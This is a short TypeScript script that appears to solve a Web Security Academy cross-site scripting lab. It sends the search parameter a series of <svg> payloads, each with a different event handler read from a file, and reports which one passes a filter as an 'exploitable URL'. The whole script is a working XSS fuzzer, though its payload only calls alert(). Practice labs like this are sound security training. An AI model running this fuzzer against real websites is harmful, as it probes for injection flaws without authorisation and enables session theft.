import axios from "axios";
import * as fs from "fs";
import * as path from "path";

const baseURL =
  "https://0ac5007903ae59d9c0ee4f71008a0091.web-security-academy.net/?search=test";

const attack = async () => {
  const presetsPath = path.join(__dirname, "../");
  const events = fs
    .readFileSync(presetsPath + "events.txt")
    .toString()
    .split("\n");
  let vulnerableTag = "svg";
  console.log("Vulnerable tag is: ", vulnerableTag);
  let vulnerableEvent: string;
  let exploitableURL: string;
  for (let event of events) {
    try {
      const modifiedURL =
        baseURL + `<${vulnerableTag} ${event}=alert()></${vulnerableTag}>`;
      const res = await axios.get(modifiedURL);
      if (res.status === 200) {
        vulnerableEvent = event;
        exploitableURL = modifiedURL;
      }
    } catch (e) {
      console.log(e.response);
      if (e.response.status === 400) {
        continue;
      } else {
        break;
      }
    }
  }

  console.log(
    "Vulnerable tag and event are: ",
    vulnerableTag,
    " and ",
    vulnerableEvent
  );
  console.log("Exploitable URL is: ", exploitableURL);
};

attack();
